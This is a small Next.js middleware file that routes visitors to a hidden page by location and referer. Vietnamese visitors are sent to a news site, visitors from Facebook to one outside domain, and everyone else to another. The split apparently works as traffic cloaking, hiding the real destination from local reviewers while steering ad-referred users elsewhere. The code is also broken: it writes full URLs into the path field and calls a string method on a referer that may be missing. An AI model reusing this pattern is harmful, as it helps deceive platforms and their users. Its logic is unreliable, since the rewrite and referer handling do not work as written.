import { NextResponse } from 'next/server';

// The country to block from accessing the secret pageVN
const BLOCKED_COUNTRY = 'VN';

// Trigger this middleware to run on the `/secret-page` route
export const config = {
    matcher: '/secret-page',
};

export function middleware(req) {
    // Extract country. Default to US if not found.
    const country = (req.geo && req.geo.country) || 'US';
    const referer = req.headers.get('referer');

    console.log(req.headers.get('referer'));
    console.log(country);

    // Specify the correct route based on the requests location
    if (country === BLOCKED_COUNTRY) {
        req.nextUrl.pathname = 'https://vnexpress.net/';
    } else {
        if(referer.includes('facebook')) {
            req.nextUrl.pathname = 'https://svykute.com/';
        }
        else {
            req.nextUrl.pathname = 'https://zululion.com/';
        }
    }

    // Rewrite to URL
    return NextResponse.rewrite(req.nextUrl);
}